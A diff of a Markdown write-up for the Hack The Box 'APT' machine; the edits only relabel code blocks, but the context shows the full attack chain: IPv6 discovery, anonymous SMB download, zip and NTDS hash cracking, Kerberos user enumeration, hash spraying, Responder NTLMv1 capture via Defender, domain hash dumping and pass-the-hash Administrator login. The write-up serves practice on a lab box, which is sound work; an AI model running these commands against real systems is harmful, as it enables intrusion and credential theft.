@@ -124,7 +124,7 @@ UUID: E60C73E6-88F9-11CF-9AF1-0020AF6E72F4 v2.0
 The scan provides bunch of RPC endpoints and their UUIDs.
 The MS-DCOM ones are defined [in here](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4).  looking at there we can find `IObjectExporter` or `IOXIDResolver`. We can use [this script by mubix](https://github.com/mubix/IOXIDResolver/blob/main/IOXIDResolver.py)
 to resolve the IPv6.
-```terminal
+```console
 ~$ python3 scripts/IOXIDResolver.py -t 10.129.96.60
 [*] Retrieving network interface of 10.129.96.60
 Address: apt
@@ -142,7 +142,7 @@ dead:beef::b885:d62a:d679:573f apt6.htb
 
 Scanning the IPv6 reveals much more on the box.
 
-```terminal
+```console
 └──╼ [★]$ nmap -6 -p- -sCV --min-rate 10000 -oA nmap/ipv6.scan apt.htb
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-11 11:26 EDT
 Nmap scan report for apt.htb (dead:beef::b885:d62a:d679:573f)
@@ -225,7 +225,7 @@ _we can update our /etc/hosts and add `htb.local`._
 ### SMB Port 445
 
 Netexec has support for IPv6, running it against we find a share `backup` which looks very interesting since we have anon login.
-```terminal
+```console
 └──╼ [★]$ nxc smb apt.htb --shares -u '' -p ''
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [*] Windows Server 2016 Standard 14393 x64 (name:APT) (domain:htb.local) (signing:True) (SMBv1:True)
 SMB         dead:beef::b885:d62a:d679:573f 445    APT              [+] htb.local\: 
@@ -254,7 +254,7 @@ apt.htb is an IPv6 address -- no workgroup available
 ```
 
 We can find a zip file in backup share and BOOM! we can download it.
-```terminal
+```console
 └──╼ [★]$ smbclient \\\\apt.htb\\backup
 Password for [WORKGROUP\user]:
 Anonymous login successful
@@ -272,7 +272,7 @@ _If you can't download the backup.zip file, consider using pwnbox for it._
 Unfortunately we can't unzip the backup.zip file since it's password protected.
 #### Generate/Crack  the hash
 But we can use `zip2john` to get the hash of the zip and crack it with `hashcat`.
-```terminal
+```console
 └──╼ [★]$ zip2john backup.zip > hash.txt
 ver 2.0 backup.zip/Active Directory/ is not encrypted, or stored with non-handled compression type
 ver 2.0 backup.zip/Active Directory/ntds.dit PKZIP Encr: cmplen=8483543, decmplen=50331648, crc=ACD0B2FB ts=9CCA cs=acd0 type=8
@@ -288,7 +288,7 @@ backup.zip:$pkzip$4*1*1*0*8*24*9beb*0f135e8d5f02f852643d295a889cbbda196562ad4242
 ```
 
 Let's crack it with hashcat. looking at hashcat examples we can find it matches the `PKZIP Compressed Multi-File`. which is mode 17220.
-```terminal
+```console
 hashcat -m 17220 hash.txt /usr/share/wordlists/rockyou.txt --user
 ```
 The Password is: _iloveyousomuch_.
@@ -298,7 +298,7 @@ unzipping it we find really interesting things. whole AD backup and registry.
 
 Since we have `ntds.dit, SECURITY, SYSTEM` we can dump the hashes using `Impacket`'s `secretdump`.
 we only need ntds.dit and SYSTEM to dump the hashes.
-```terminal
+```console
 └──╼ [★]$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL > backup.txt
 └──╼ [★]$ grep ':::' backup.txt | wc -l
 2000
@@ -307,18 +307,18 @@ we only need ntds.dit and SYSTEM to dump the hashes.
 
 We have `2000` users, we can validate what are the user that exist on machine from this backup list via Kerberos (we saw on IPv6 TCP 88).
 Let's filter the users first.
-```terminal
+```console
 └──╼ [★]$ grep ':::' backup.txt | awk -F: '{print $1}' > users.list
 └──╼ [★]$ wc -l users.list 
 2000 users.list
 ```
 here is a bit tricky part, in order to get kerbrute connected with DC we need to define IPv6 as this:
-```terminal
+```console
 dead:beef::b885:d62a:d679:573f apt6.htb htb.local
 ```
 
 We get valid users:
-```terminal
+```console
 └──╼ [★]$ ./kerbrute_linux_amd64 userenum -d htb.local --dc apt6.htb users
 
     __             __               __     
@@ -412,13 +412,13 @@ for x in passwords:
     sleep(SLEEP_TIME)
 ```
 we have to filter the hashes:
-```terminal
+```console
 cat dump.txt | grep ":::" | cut -d: -f 3-4 > hashes
 cat hashes | tr ":" " " > hashes2
 cat hashes2 | awk {'print $2'} > hashes.txt
 ```
 Running the script against the box gives us the valid hash for the user `henry.vinson`
-```terminal
+```console
 └──╼ [★]$ python3 hashspray.py 
 [+] Success htb.local/henry.vinson
 [+] Success e53d87d42adaa3ca32bdb34a876cbffb
@@ -428,7 +428,7 @@ _Note: it's going to take very long time. ~18 minutes_
 We can't get any much info as this user since it doesn't have WinRM permissions. but we can access the remote registry. you can read more about it [here](https://itfordummies.net/2016/09/06/read-remote-registry-powershell/).
 There is another cool way to pop up a shell using mimikatz that [0xdf showed in his blog for this box](https://0xdf.gitlab.io/2021/04/10/htb-apt.html#remote-access). 
 Let's try to look at remote registry using `Impacket`'s `reg`.
-```terminal
+```console
 └──╼ [★]$ impacket-reg -hashes  aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -447,7 +447,7 @@ HKU\SOFTWARE\Classes
 
 All of these regs looks normal except the `GiganticHostingManagementSystem`, Let's take a look at it.
 Woah, we find the cerds for another user.
-```terminal
+```console
 └──╼ [★]$ impacket-reg -hashes  aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -480,7 +480,7 @@ We can use Windows Defender to scan a file on our host that doesn't exist and ca
 But in order for crack.sh to crack the hashes, we need to edit the challenge in responder conf file. more explained on [crack.sh](https://crack.sh/netntlm/).
 The conf file is under `/usr/share/responder` named `Responder.conf`.
 
-```terminal
+```console
 sudo responder -I tun0 --lm
 ```
 _`--lm` flag is to force a downgrade to Net-NTMLv1_
@@ -495,7 +495,7 @@ We have responder running on the other side now we can start the Defender scan.
 -  `-File \\IP\Share\doesnt_exist.o` will tell defender to scan a file on our machine.
 
 Looking at responder tab, we got the NTLM with the challenge response
-```terminal
+```console
 [SMB] NTLMv1 Client   : 10.129.96.60
 [SMB] NTLMv1 Username : HTB\APT$
 [SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
@@ -508,14 +508,14 @@ NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384
 ```
 
 The machine hash is 
-```terminal
+```console
 d167c3238864b12f5f82feae86a7f798
 ```
 
 _Sadly crack.sh's DES cracker is down, and you can't crack the hash there might be other ways to do it since it's DES._
 
 We can't login as the machine account into the machine but we can dump the hashes of all other users:
-```terminal
+```console
 └──╼ [★]$ impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798 htb.local/APT\$@htb.local
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
@@ -549,7 +549,7 @@ APT$:des-cbc-md5:76c45245f104a4bf
 ```
 
 And we have the Administrator hash of the box.
-```terminal
+```console
 └──╼ [★]$ evil-winrm -i htb.local -u Administrator -H c370bddf384a691d811ff3495e8a72e2
 
 Evil-WinRM shell v3.5
